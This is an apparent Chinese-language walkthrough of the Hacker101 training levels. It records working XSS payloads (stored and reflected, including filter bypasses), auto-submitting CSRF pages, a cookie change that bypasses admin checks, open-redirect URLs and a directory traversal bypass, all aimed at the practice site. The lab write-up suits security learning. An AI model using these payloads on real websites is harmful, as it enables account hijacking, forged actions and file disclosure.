<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;levels&#x2F;0&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: levels-a.hacker101.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Referer: https:&#x2F;&#x2F;levels-a.hacker101.com&#x2F;levels&#x2F;0&#x2F;</span><br><span class="line">Cookie: SACSID&#x3D;~AJKiYcHhGpu6PLMyeIsvo_lfjScoVo39CNylmh9BaI6_3jAwKOGUqDAEkKzhCofsSw7y1X_V7lFNTj-tT71ZWWRCNHLF5SKYWmuKHxyW2FWtd4optMQtaYzsYu6L2d5wTz3agQJU87kT7C-ibOhaAmoAGa1Rp5WZuqSdM2yXkxl7S3wV8NE3dzllcp72U7G6M35BEdv17DEQe0JdQPSfI6iAFB2Tmf1CbDGj2VCPnS7hBriVanmD8DkhZXft9G2yWjgSfWecvJO8_OLrMFi12Ogf9sbbLM78wVjV3pY_R-eSA-O8FjCBaTPvgRIGklnli_LM4YOAK7HS2o43B-ITpJoD5_FTZ9cGbQ</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 28</span><br><span class="line"></span><br><span class="line">to&#x3D;1811&amp;amount&#x3D;111&amp;from&#x3D;1221</span><br></pre></td></tr></table></figure>
<p>权限绕过 参考 <a target="_blank" rel="noopener" href="https://octfive.cn/299">https://octfive.cn/299</a></p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="./1517843759102.png" alt="1517843759102"></p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ol>
<li><p>判断哪些符号被过滤输入 </p>
<p>测试<code>&#39;&lt;&gt;:;&quot;test</code>  ，结果<code>&lt;td&gt;&#39;&amp;lt;&amp;gt;:;&quot;test&lt;/td&gt;</code>，可以看出尖括号被过滤了。</p>
</li>
<li><p>是否有部分标签没有被过滤</p>
<p>测试测试<code>&lt;img&gt;</code>，结果<code>&lt;td&gt;&amp;lt;img&amp;gt;&lt;/td&gt;</code>。<code>&lt;img&gt;</code> 被过滤。</p>
</li>
<li><p>判断是否为递归转译</p>
<p>测试<code>&lt;im&lt;img&gt;g&gt;</code>，结果<code>&lt;td&gt;&amp;lt;im&amp;lt;img&amp;gt;g&amp;gt;&lt;/td&gt;</code>， 是递归转移。</p>
</li>
<li><p>url编码绕过，看服务端是否会还原url编码</p>
<p>测试<code>%3cscript%3ealert(%22xss%22)%3c/script%3e</code>， url编码没有被还原。script关键字没有被过滤。</p>
<p>后测试unicode编码<code>\u003cimg src=1 onerror=alert(/xss/)\u003e</code>、 <code>u003cimg src=1 onerror=alert(/xss/)u003e</code></p>
</li>
<li><p>仔细看题发现，提示“HTML disallowed, but links will be clickable.”、</p>
<p>5.1 测试<code>&lt;a herf=&quot;http://www.test.com&quot;&gt;Click&lt;/a&gt;</code>,结果<code>&lt;td&gt;&amp;lt;a herf=&quot;&lt;a href=&quot;http://www.test.com&quot;&amp;gt;Click&amp;lt;/a&amp;gt;&quot;&gt;http://www.test.com&quot;&amp;gt;Click&amp;lt;/a&amp;gt;&lt;/a&gt;&lt;/td&gt;</code>, 发现可以利用。</p>
<p>5.2 加入JavaScript伪协议<code>&lt;a herf=javascript:alert(1);&gt;Click&lt;/a&gt;</code>,结果 <code>&lt;td&gt;&amp;lt;a herf=javascript:alert(1);&amp;gt;Click&amp;lt;/a&amp;gt;&lt;/td&gt;</code>, 发现被转译</p>
<p>5.3 将javascript:alert(1) 放在href中判断是否服务端通过关键字匹配过滤掉了javascript:alert(1) .<code>&lt;a herf=&quot;[http://www.javascript:alert(1).com&quot;&gt;Click](http://www.javascript:alert%281%29.com)</code>, 结果<code>&lt;td&gt;&amp;lt;a herf=&quot;&lt;a href=&quot;http://www.javascript:alert(1).com&quot;&amp;gt;Click&amp;lt;/a&amp;gt;&quot;&gt;http://www.javascript:alert(1).com&quot;&amp;gt;Click&amp;lt;/a&amp;gt;&lt;/a&gt;&lt;/td&gt;</code>。发现javascript:alert(1)没有被过滤。事实上在5.2中就可以看出来没有被过滤。但是在5.2中没有触发出异常。</p>
<p>5.4 开始一点一点删除5.3的herf中字符，向5.2靠近。最后发现必须是<code>&lt;a href=&quot;http://</code> 的格式才能触发异常，于是开始构建代码进行处理。能够被解析成为html代码的片段，只能是href中的部分。于是需要绕过<strong>空格限制 </strong>。</p>
<p>5.5 绕过空格限制</p>
<p>​    测试<code>&lt;a herf=&quot;http://&quot;onmouseover=javascript:alert(1)</code>， 结果<code>&lt;td&gt;&amp;lt;a herf=&quot;&lt;a href=&quot;http://&quot;onmouseover=javascript:alert(1)&quot;&gt;http://&quot;onmouseover=javascript:alert(1)&lt;/a&gt;&lt;/td&gt;</code> 。发现是双引号没有匹配正确，试了好几次发现只要添加一个<code>&quot;</code> ，使引号正确配对就可以了。</p>
</li>
<li><p>最终代码<br>payload</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">herf</span>=<span class="string">&quot;http://&quot;</span><span class="attr">onmouseover</span>=<span class="string">&quot;javascript:alert(1)</span></span></span><br></pre></td></tr></table></figure>
<p>经过后台处理的代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="symbol">&amp;lt;</span>a herf=&quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://&quot;</span><span class="attr">onmouseover</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>http://&quot;onmouseover=&quot;javascript:alert(1)<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当鼠标经过是,出现弹窗。故说明存在存储型XSS。</p>
</li>
<li><p>其他的一些尝试</p>
<p>7.1 使用url编码空格为%20，无效。</p>
<p>7.2 使用；代替空格，无效。这个姿势不知道行不行，记不清书上怎么讲的了。</p>
</li>
<li><p>发现一个技巧  </p>
<p>不一定每次都要提交自己的代码，让服务器解析，来看载荷的效果。也可以现在本地测试一下，优化一下自己的载荷后，再提交。即使用F12调出调试工具，编辑html，在被服务器解析的源码基础上测试可能的方案，调优后在提交到服务器测试。这样做的好处是，减少了测试的时间，比如这一道题目是存储型的XSS，当提交了数据后后跳转到另一界面，看结果看需要跳转回来。如果每次都能提交更优的载荷，那么就会省掉很多这种跳转操作。</p>
<p>简而言之:  <strong>对自己的猜测，尽量在本地测试一下</strong> </p>
<p><img src="./XSS trick.gif" alt="XSS trick"></p>
</li>
</ol>
<h3 id="CSRF-with-csrf-token"><a href="#CSRF-with-csrf-token" class="headerlink" title="CSRF with csrf token"></a>CSRF with csrf token</h3><p>Token重用  + XSS</p>
<p>想过，用xss获取token，但由于引发xss的前提是需要提前知道csrf token 所以这种方法行不通。</p>
<p>又过了两天，拿起再看看，试试重放，发现成功了。csrf不是使用一次就失效，可以多次使用。首先获取到提交页面获取token，然后在利用代码中使用。后来，看别人的解答。才知道只要给任意32位的token就能过，只验证了token的长度，没有验证token的内容。回过头来看重放的思路不对，作者的意图是让我们猜测csrf token的结构，然后构造token进行绕过。以下应当才是正确的思路。</p>
<p>另外token是用户名的MD5值，可根据用户名构造token。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Test CSRF <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>  <span class="attr">onload</span>=<span class="string">&quot;getCSRFToekn()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://levels-a.hacker101.com/levels/1/&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-frame&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&#x27;POST&#x27;</span> <span class="attr">action</span>=<span class="string">&#x27;https://levels-a.hacker101.com/levels/1/post&#x27;</span> <span class="attr">target</span>=<span class="string">&quot;csrf-frame&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;getCSRFToekn()&quot;</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;status&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;&lt;a herf=&quot;http://&quot;onmouseover=&quot;javascript:alert(1)&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;csrf&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;56d27afecc9f901080e76f45c12747bd&#x27;</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Auto submit the form when page loads --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">&quot;csrf-form&quot;</span>).submit()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Forced-Browsing"><a href="#Forced-Browsing" class="headerlink" title="Forced Browsing"></a>Forced Browsing</h3><p>查看自己每次测试的详情，更改id能够访问别人的测试记录。</p>
<p>自己的记录</p>
<p>   <img src="./1517836758756.png" alt="1517836758756"></p>
<p> 别人的记录 <img src="./1517837065692.png" alt="1517837065692"></p>
<p>存储型XSS + 强制浏览<img src="./Forced Browsing 2.gif" alt="Forced Browsing 2"></p>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p><img src="./1517843790308.png" alt="1517843790308"></p>
<h3 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h3><p>测试了一下Nickname，发现&lt;&gt;’”等符号被转译，于是测试图片地址。pic的地址必须以.png .jpg 结尾，所以代码插在地址中间部分。</p>
<p><img src="./1517841300615.png" alt="1517841300615"></p>
<p>另外description也存在存储型XSS。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ red&quot;&gt;&lt;img src&#x3D;&quot;&quot; onerror&#x3D;&quot;alert(1)&quot; &#x2F;&gt; &quot; | All ] [ orange | the ] [ yellow | colors ] [ green | of ] [ blue | the ] [ purple | rainbow! ]</span><br></pre></td></tr></table></figure>
<p>“颜色” 没有进行过滤和转发，在各种颜色后面都可以触发XSS。</p>
<h3 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;levels-a.hacker101.com&#x2F;levels&#x2F;2&#x2F;edit?id&#x3D;&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>测试参数id，发现存在发射型XSS。</p>
<p><img src="./1517843354347.png" alt="1517843354347"></p>
<h3 id="Unrelated-Bonus"><a href="#Unrelated-Bonus" class="headerlink" title="Unrelated Bonus"></a>Unrelated Bonus</h3><p>不知道是什么意思</p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p><img src="./1517886629056.png" alt="1517886629056"></p>
<p>进来看了一下题，有xss，但是没有框、参数之类的。那就先做Improper Authorization吧！</p>
<h3 id="Improper-Authorization"><a href="#Improper-Authorization" class="headerlink" title="Improper Authorization"></a>Improper Authorization</h3><p>源码里的js写的很清楚，需要改cookie绕过登录。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> page = <span class="built_in">window</span>.location.hash.substring(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(page == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">truepage = <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">true<span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">true<span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> cookies) &#123;</span><br><span class="line">truetrue<span class="keyword">var</span> cookie = cookies[i].replace(<span class="regexp">/ /g</span>, <span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">truetrue<span class="keyword">if</span>(cookie[<span class="number">0</span>] == <span class="string">&#x27;admin&#x27;</span> &amp;&amp; cookie[<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">truetrue<span class="built_in">document</span>.write(<span class="string">&#x27;&lt;a href=&quot;/levels/3/admin?page=&#x27;</span> + page + <span class="string">&#x27;&quot;&gt;Edit this page&lt;/a&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="./1517887951491.png" alt="1517887951491"></p>
<p>结合js和cookie值可知，修改cookie中admin对应的值1,即可。</p>
<p><img src="./1517886865871.png" alt="1517886865871"></p>
<p>修改之后，首页多了一个链接。现在的身份已经是admin了。</p>
<p><img src="./1517886498406.png" alt="1517886498406"></p>
<h4 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h4><p>调试的时候，不知道cookie[0]当前值为多少，但想知道当前值是多少。怎么办，可以写油猴脚本。此题这样做可能会复杂一点，若是复杂一点的逻辑可以试试这种方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         HACKER101 Level 3</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  try to take over the world!</span></span><br><span class="line"><span class="comment">// @author       You</span></span><br><span class="line"><span class="comment">// @match        https://levels-a.hacker101.com/levels/3/</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">    &#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> page = <span class="built_in">window</span>.location.hash.substring(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(page == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        page = <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> cookies) &#123;</span><br><span class="line">        <span class="keyword">var</span> cookie = cookies[i].replace(<span class="regexp">/ /g</span>, <span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;cookie:&quot;</span> + cookie);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;cookie[0]:&quot;</span> + cookie[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;cookie[1]:&quot;</span> + cookie[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span>(cookie[<span class="number">0</span>] == <span class="string">&#x27;admin&#x27;</span> &amp;&amp; cookie[<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;&lt;a href=&quot;/levels/3/admin?page=&#x27;</span> + page + <span class="string">&#x27;&quot;&gt;Edit this page&lt;/a&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Your code here...</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>重新加载页面，就能看到cookie、cookie[0]、cookie[1]的值了。如果这些值没有满足条件，只需针对性修改就可以了。这样做的好处是很直观。</p>
<p><strong>解此题</strong></p>
<p>首先看看cookie、cookie[0]、cookie[1]的值。这题要求cookie[0]等于admin，cookie[1]等于1。现在cookie[0]满足条件了，现在只需要修改cookie[1]让它等于1。</p>
<p><img src="./1517887482097.png" alt="1517887482097"></p>
<p>修改admin的cookie值为1后的输出，现在条件都满足了。这一题完成了！</p>
<p><img src="./1517887294804.png" alt="1517887294804"></p>
<h3 id="Various-XSS"><a href="#Various-XSS" class="headerlink" title="Various XSS"></a>Various XSS</h3><ul>
<li><p>Page Body 存储型XSS</p>
<p>直接插入script会被过滤掉。img标签还是很好用。</p>
<p>虽然提示说DOM事件会被过过滤，难道是漏洞了onerror。也不是，测试发现之后onerror在img标签内才不会被过滤掉，在a标签中就被过滤掉了（会显示JS Detected!）。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- img onerror --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- script大小写绕过 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- action --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">&quot;javascript:alert(1)&quot;</span> <span class="attr">type</span>=<span class="string">image</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- data --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="./1517888597706.png" alt="1517888597706"></p>
</li>
</ul>
<p>xss弹窗</p>
<p><img src="./1517891355836.png" alt="1517891355836"></p>
<p>xss绕过参考：<a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/20282.html">http://www.freebuf.com/articles/web/20282.html</a></p>
<h3 id="Unrelated-Bonuses"><a href="#Unrelated-Bonuses" class="headerlink" title="Unrelated Bonuses"></a>Unrelated Bonuses</h3><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p><img src="./1517919228408.png" alt="1517919228408"></p>
<p>有点像hackernews，点进去是大家的测试代码，看来不少人测试成功了（一进去满是弹窗）。</p>
<h3 id="XSS-1"><a href="#XSS-1" class="headerlink" title="XSS"></a>XSS</h3><p>把之前第二题用过的代码<code>herf=&quot;http://&quot;onmouseover=&quot;javascript:alert(1)</code>，放在进去测试。</p>
<p><img src="./1517919354097.png" alt="1517919354097"></p>
<p>以下是服务器处理之后，返回的代码。可以看出<code>herf=&quot;http://&quot;onmouseover=&quot;javascript:alert(1)</code> 中第一个<code>&quot;</code> 之后的代码在后面出现了而且还没有被转译。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://<span class="symbol">&amp;#34;</span>onmouseover=<span class="symbol">&amp;#34;</span>javascript:alert(1)&quot;</span>&gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> (&quot;onmouseover=&quot;javascript:alert(1))<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>于是构造出<code>http://&quot;&quot;&lt;img src=&quot;&quot; onerror=alert(2)&gt;</code> ,提交弹窗出现了。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://<span class="symbol">&amp;#34;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;lt;</span>img src=<span class="symbol">&amp;#34;</span><span class="symbol">&amp;#34;</span> onerror=alert(1024)<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span>try again<span class="tag">&lt;/<span class="name">a</span>&gt;</span> (&quot;&quot;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1024)</span>&gt;</span>)<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="./1517919940872.png" alt="1517919940872"></p>
<h3 id="CSRF-1"><a href="#CSRF-1" class="headerlink" title="CSRF"></a>CSRF</h3><ul>
<li><p>发布帖子</p>
<blockquote>
<p>用两个账号获取不同的csrf<br>2e2e2e4e6f7420746869732074696d6521fead9de65b071673d99156141e19792f<br>2e2e2e4e6f7420746869732074696d6521b8a293a191f581aaf42bbf2a2df4f24f</p>
<p>66位</p>
<p>使用 burpsuite 发现前面一部份是ASCII HEX编码<br>2e2e2e4e6f7420746869732074696d6521<br>…Not this time!</p>
<p>剩下的32位 应该是md5，应该和用户名有关<br>fead9de65b071673d99156141e19792f<br>b8a293a191f581aaf42bbf2a2df4f24f<br>尝试了用户名/…Not this time!/Breaker News 各种组合的MD5但是不对<br>…Not this time! 的意思是不是要做其他题，然后回头来做这题。例如Systemic Information Disclosures会不会有提示！</p>
</blockquote>
</li>
<li><p>删帖（无效）</p>
<p>把id换成被人的，提示不能删除。这个功能不存在csrf。</p>
<p><img src="./1517925099885.png" alt="1517925099885"></p>
</li>
</ul>
<ul>
<li><p>点赞</p>
<p>点赞呢？csrf点赞。</p>
<p>首先，不存在重复点赞的情况。（重放攻击，刷赞）</p>
<p>只要指定id就能为别人刷赞，这也应该一个是csrf吧！firefox有效，chrome无效。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Test CSRF <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://levels-a.hacker101.com/levels/4/vote?change=1&amp;type=Story&amp;id=4721001476653056&amp;from=https://levels-a.hacker101.com/levels/4/&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;none&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Unchecked-Redirects"><a href="#Unchecked-Redirects" class="headerlink" title="Unchecked Redirects"></a>Unchecked Redirects</h3></li>
</ul>
<p>理论：<a target="_blank" rel="noopener" href="http://blog.csdn.net/quiet_girl/article/details/50616927">http://blog.csdn.net/quiet_girl/article/details/50616927</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;levels-a.hacker101.com&#x2F;levels&#x2F;4&#x2F;vote?change&#x3D;1&amp;type&#x3D;Story&amp;id&#x3D;4721001476653056&amp;from&#x3D;http:&#x2F;&#x2F;www.google.com</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;levels-a.hacker101.com&#x2F;levels&#x2F;4&#x2F;delete?id&#x3D;6324050641027072&amp;type&#x3D;Story&amp;from&#x3D;https:&#x2F;&#x2F;www.google.com</span><br></pre></td></tr></table></figure>
<p>在投票、删帖之后需要跳转后原来的页面，但可以修改from的值。由于没有任何检查，从而实现重定向到任意的url。</p>
<h3 id="Systemic-Information-Disclosures"><a href="#Systemic-Information-Disclosures" class="headerlink" title="Systemic Information Disclosures"></a>Systemic Information Disclosures</h3><p>绝对路径泄露，不知道算不算？</p>
<p><img src="./1519655383819.png" alt="1519655383819"></p>
<h3 id="Improper-Identity-Handling"><a href="#Improper-Identity-Handling" class="headerlink" title="Improper Identity Handling"></a>Improper Identity Handling</h3><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p><img src="./1519805326170.png" alt="1519805326170"></p>
<h3 id="Directory-Traversal"><a href="#Directory-Traversal" class="headerlink" title="Directory Traversal"></a>Directory Traversal</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;levels-b.hacker101.com&#x2F;level5?path&#x3D;.&#x2F;..&#x2F;..&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="./1519782047229.png" alt="1519782047229"></p>
<h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>直接跟路径发现报错（路径遍历的时候 <a target="_blank" rel="noopener" href="https://levels-b.hacker101.com/level5/read?path=../main.py），提示No">https://levels-b.hacker101.com/level5/read?path=../main.py），提示No</a> such file: main.py。猜测过滤掉了../，尝试绕过。使用 <a target="_blank" rel="noopener" href="https://levels-b.hacker101.com/level5/read?path=....//main.py">https://levels-b.hacker101.com/level5/read?path=....//main.py</a> 读取到了文件。</p>
<h3 id="Reflected-XSS-1"><a href="#Reflected-XSS-1" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h3><p>path参数存在反射性XSS漏洞，当路径不存在时未经过滤而直接报错输出。</p>
